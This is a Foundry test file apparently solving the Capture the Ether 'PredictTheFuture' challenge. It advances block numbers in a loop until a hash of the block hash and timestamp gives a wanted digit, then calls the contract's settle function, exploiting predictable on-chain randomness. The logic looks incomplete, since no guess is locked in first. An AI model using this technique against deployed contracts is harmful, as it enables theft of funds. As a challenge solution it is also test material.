pragma solidity >=0.5.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "forge-std/console.sol";
import "./PredictTheFutureChallenge.sol";


contract PredictTheFutureChallengeTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    PredictTheFutureChallenge challengeContract;
      address hackerAddress = address(0);

  function setUp() public {
    vm.deal(hackerAddress, 1 ether);
    vm.roll(5);
    challengeContract = new PredictTheFutureChallenge{value: 1 ether}();
  }

  function testHackTheContract() public {

    vm.startPrank(hackerAddress);
    uint8 answer = 0;
    for (uint256 index = 0; index < 100; index++) {
      vm.roll(block.number + 1);
      answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number -1), block.timestamp))));
      //console.log(answer%10);
      if ((answer %10) == 0){
        break;
      }
    }

    uint8 getGuess = challengeContract.getGuess();
    uint256 getSettlementBlockNumber = challengeContract.getSettlementBlockNumber();
    address getGuesser = challengeContract.getGuesser();
    
    challengeContract.settle{value: 1 ether}();
    bool isComplete = challengeContract.isComplete();
    console.log(isComplete);

    assert(isComplete);
    vm.stopPrank();
  }
  //forge test --match-path src/PredictTheFuture/PredictTheFutureChallengeTest.t.sol -vv

}